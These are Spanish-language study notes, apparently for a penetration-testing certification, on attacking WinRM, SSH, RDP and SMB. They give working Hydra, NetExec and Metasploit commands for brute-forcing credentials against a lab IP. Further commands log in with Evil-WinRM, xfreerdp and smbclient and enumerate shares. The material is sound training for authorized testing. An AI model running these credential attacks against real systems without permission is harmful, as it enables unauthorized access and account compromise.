
## 1. Conceptos clave

Durante un pentest podemos encontrar servicios de red que permiten acceder a sistemas, ejecutar comandos, transferir archivos o administrar recursos remotamente.

**Servicios habituales:**

|Servicio|Puerto por defecto|Función|
|---|---|---|
|FTP|TCP 21|Transferencia de archivos|
|SSH|TCP 22|Acceso remoto seguro|
|Telnet|TCP 23|Acceso remoto sin cifrado|
|SMTP|TCP 25|Envío de correo electrónico|
|DNS|TCP/UDP 53|Resolución de nombres|
|HTTP|TCP 80|Servicio web|
|SMB|TCP 445|Compartición de archivos en redes Windows|
|RDP|TCP 3389|Escritorio remoto de Windows|
|MSSQL|TCP 1433|Base de datos Microsoft SQL Server|
|MySQL|TCP 3306|Base de datos MySQL|
|WinRM|TCP 5985/5986|Administración remota de Windows|
|LDAP|TCP/UDP 389|Acceso a servicios de directorio|
|LDAPS|TCP 636|LDAP mediante TLS|

Muchos de estos servicios utilizan autenticación mediante usuario y contraseña. Si las credenciales son débiles, podemos intentar recuperarlas mediante ataques de diccionario o fuerza bruta.

> Los puertos indicados son los valores predeterminados; pueden cambiar según la configuración del servicio.

## 2. WinRM (Windows Remote Management)

WinRM es la implementación de Microsoft del protocolo WS-Management y permite administrar sistemas Windows remotamente.

**Puertos predeterminados:**

- `5985/TCP`: HTTP.
    
- `5986/TCP`: HTTPS.
    

Es especialmente útil durante un pentest porque unas credenciales válidas pueden permitir ejecutar comandos en el sistema remoto.

### Instalar NetExec

```
sudo apt-get -y install netexec
```

### Consultar la ayuda

```
netexec -h
```

Para consultar las opciones específicas de un protocolo:

```
netexec smb -h
netexec winrm -h
netexec ssh -h
netexec rdp -h
```

### Sintaxis general

```
netexec <protocolo> <IP> -u <usuario_o_lista> -p <contraseña_o_lista>
```

### Probar credenciales contra WinRM

En un laboratorio autorizado:

```
netexec winrm 10.129.42.197 -u user.list -p password.list
```

**Interpretación del resultado:**

```
[+] None\user:password (Pwn3d!)
```

La marca `(Pwn3d!)` indica que las credenciales han sido aceptadas y que NetExec identifica la posibilidad de ejecutar comandos mediante el protocolo.

### Conectarse con Evil-WinRM

Instalación:

```
sudo gem install evil-winrm
```

Conexión:

```
evil-winrm -i <IP> -u <usuario> -p <contraseña>
```

Ejemplo:

```
evil-winrm -i 10.129.42.197 -u user -p password
```

Si la autenticación funciona, obtendremos una consola PowerShell remota.

**Importante:** tener credenciales válidas no garantiza que el usuario tenga permisos para utilizar WinRM.

## 3. SSH (Secure Shell)

SSH permite conectarse a sistemas remotos para ejecutar comandos y transferir archivos.

- **Puerto predeterminado:** TCP 22.
    
- Es habitual en Linux, aunque también puede estar habilitado en Windows.
    

SSH utiliza diferentes mecanismos criptográficos:

- **Cifrado simétrico:** emplea la misma clave para cifrar y descifrar. Se utilizan mecanismos como Diffie-Hellman para acordar claves compartidas.
    
- **Cifrado asimétrico:** utiliza una clave pública y otra privada. Las claves SSH pueden emplearse para autenticar al usuario.
    
- **Hashing:** permite verificar la integridad y autenticidad de los mensajes mediante mecanismos criptográficos.
    

### Ataque de diccionario con Hydra

```
hydra -L user.list -P password.list ssh://10.129.42.197
```

**Parámetros:**

- `-L user.list`: archivo con múltiples usuarios.
    
- `-P password.list`: archivo con múltiples contraseñas.
    
- `ssh://IP`: servicio contra el que se realiza el ataque.
    

Si se encuentran credenciales válidas, podemos intentar conectarnos.

### Conexión mediante OpenSSH

```
ssh user@10.129.42.197
```

Después de aceptar la huella de la clave del servidor, introducimos la contraseña cuando se solicite.

**Nota:** verifica la huella del servidor antes de confiar en ella, especialmente fuera de un laboratorio.

## 4. RDP (Remote Desktop Protocol)

RDP permite controlar remotamente un sistema Windows mediante una interfaz gráfica.

- **Puerto predeterminado:** TCP 3389.
    
- Puede transmitir imagen, sonido, entradas de teclado y ratón, e integrar determinados recursos del cliente.
    

### Ataque de diccionario con Hydra

```
hydra -L user.list -P password.list rdp://10.129.42.197
```

RDP puede limitar las conexiones simultáneas, por lo que conviene reducir el número de tareas en los laboratorios.

Por ejemplo:

```
hydra -L user.list -P password.list -t 4 rdp://10.129.42.197
```

Un mensaje de Hydra que indica que una cuenta podría ser válida, pero no está habilitada para escritorio remoto, no equivale a disponer de acceso RDP funcional.

### Conexión con xFreeRDP

```
xfreerdp /v:<IP> /u:<usuario> /p:<contraseña>
```

Ejemplo:

```
xfreerdp /v:10.129.42.197 /u:user /p:password
```

Si la autenticación y los permisos son correctos, se abrirá una sesión gráfica remota.

## 5. SMB (Server Message Block)

SMB permite compartir archivos, directorios e impresoras en una red. Es habitual en entornos Windows y también está disponible en Linux mediante Samba.

- **Puerto habitual:** TCP 445.
    
- SMB se utiliza para acceder a recursos compartidos.
    
- CIFS es una denominación relacionada con una implementación y evolución histórica de SMB.
    

### Ataque de diccionario con Hydra

```
hydra -L user.list -P password.list smb://10.129.42.197
```

En algunas versiones de Hydra pueden aparecer errores como:

```
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

El módulo señala que esto puede deberse a incompatibilidades de versiones antiguas de Hydra con las respuestas de SMBv3.

En ese caso, podemos utilizar NetExec o el módulo de autenticación SMB de Metasploit.

### Ataque de autenticación SMB con Metasploit

Iniciar Metasploit:

```
msfconsole -q
```

Seleccionar el módulo:

```
use auxiliary/scanner/smb/smb_login
```

Configurar las listas y el objetivo:

```
set USER_FILE user.list
set PASS_FILE password.list
set RHOSTS 10.129.42.197
run
```

Una autenticación correcta puede producir un resultado similar a:

```
[+] 10.129.42.197:445 - Success: '.\user:password'
```

### Enumerar recursos compartidos con NetExec

```
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

El resultado muestra los recursos compartidos y los permisos disponibles para las credenciales utilizadas.

Ejemplo:

```
Share           Permissions
-----           -----------
ADMIN$
C$
SHARENAME       READ,WRITE
IPC$            READ
```

En este ejemplo, `SHARENAME` permite lectura y escritura al usuario autenticado.

Los recursos administrativos como `ADMIN$` y `C$` no están necesariamente accesibles para cualquier usuario.

### Acceder a un recurso compartido con smbclient

```
smbclient -U user //10.129.42.197/SHARENAME
```

Introduce la contraseña cuando se solicite.

Dentro de la consola interactiva:

```
ls
```

Otros comandos útiles de `smbclient`:

|Comando|Función|
|---|---|
|`ls`|Listar archivos y directorios|
|`cd <directorio>`|Cambiar de directorio|
|`get <archivo>`|Descargar un archivo|
|`put <archivo>`|Subir un archivo|
|`help`|Mostrar la ayuda|
|`exit`|Cerrar la sesión|

Las operaciones de subida y descarga dependen de los permisos del recurso compartido.

## 6. Opciones importantes de NetExec

NetExec admite diferentes protocolos de red y permite realizar tareas de autenticación y enumeración.

### Protocolos disponibles en el módulo

```
nfs
ftp
ssh
winrm
smb
wmi
rdp
mssql
ldap
vnc
```

### Opciones generales

|Opción|Función|
|---|---|
|`-h`|Mostrar la ayuda|
|`--version`|Mostrar la versión|
|`-t <número>`|Establecer el número de hilos|
|`--timeout <segundos>`|Configurar el tiempo máximo de espera|
|`--verbose`|Mostrar información adicional|
|`--debug`|Mostrar información de depuración|
|`--log <archivo>`|Guardar el resultado en un archivo|

### Opciones de autenticación

|Opción|Función|
|---|---|
|`-u <usuario>`|Especificar usuario o lista de usuarios|
|`-p <contraseña>`|Especificar contraseña o lista de contraseñas|
|`-H <hash>`|Autenticarse mediante un hash compatible|
|`-d <dominio>`|Especificar el dominio|
|`--local-auth`|Utilizar autenticación local|

**Importante:** las opciones disponibles dependen del protocolo seleccionado. Consulta siempre su ayuda específica:

```
netexec <protocolo> -h
```

## 7. Flujo de trabajo durante un pentest

### Paso 1. Identificar servicios y puertos

Realiza una enumeración inicial de los puertos del objetivo:

```
nmap -sV -sC -p 22,445,3389,5985,5986 <IP>
```

Este comando examina los servicios indicados y trata de identificar sus versiones y ejecutar scripts predeterminados de Nmap.

### Paso 2. Seleccionar la herramienta adecuada

|Servicio|Herramientas|
|---|---|
|SSH|Hydra, OpenSSH|
|WinRM|NetExec, Evil-WinRM|
|RDP|Hydra, xFreeRDP|
|SMB|NetExec, Hydra, Metasploit, smbclient|

### Paso 3. Probar las credenciales

Utiliza las listas de usuarios y contraseñas proporcionadas para el laboratorio:

```
netexec <protocolo> <IP> -u user.list -p password.list
```

Los ataques de autenticación deben realizarse únicamente en sistemas autorizados. En entornos reales, una gran cantidad de intentos puede activar bloqueos de cuentas o mecanismos de detección.

### Paso 4. Validar el acceso

No basta con encontrar una posible combinación de usuario y contraseña. Comprueba si permite autenticarse realmente en el servicio.

### Paso 5. Enumerar los permisos disponibles

Si obtienes acceso SMB:

```
netexec smb <IP> -u <usuario> -p <contraseña> --shares
```

Si dispones de acceso remoto por WinRM, comprueba las capacidades reales de la sesión.

### Paso 6. Aprovechar los permisos legítimos obtenidos

Según el servicio y los permisos del usuario, puede ser posible:

- Ejecutar comandos remotamente.
    
- Descargar archivos.
    
- Acceder a recursos compartidos.
    
- Obtener información útil para continuar la enumeración.

## 9. Puntos clave para el CPTS

- Identifica los servicios y sus puertos antes de seleccionar una herramienta de ataque.
    
- **WinRM:** puertos TCP 5985 y 5986. NetExec permite comprobar credenciales y Evil-WinRM proporciona una consola remota.
    
- **SSH:** puerto TCP 22. Hydra puede probar credenciales y OpenSSH permite iniciar sesión.
    
- **RDP:** puerto TCP 3389. Hydra puede comprobar credenciales y xFreeRDP permite acceder mediante una interfaz gráfica.
    
- **SMB:** puerto TCP 445. NetExec permite comprobar credenciales y enumerar recursos compartidos; `smbclient` permite interactuar con ellos.
    
- `-L` y `-P` en Hydra especifican archivos de usuarios y contraseñas, respectivamente.
    
- Unas credenciales válidas no garantizan que el usuario tenga permisos para acceder a todos los servicios.
    
- La marca `(Pwn3d!)` de NetExec indica que el acceso obtenido ofrece capacidades de ejecución según las comprobaciones de la herramienta.
    
- Si Hydra falla contra SMB, comprueba la versión y considera herramientas alternativas como NetExec o Metasploit.
    
- En la fase posterior a la autenticación, enumera los recursos y permisos disponibles: el acceso inicial es solo el primer paso.
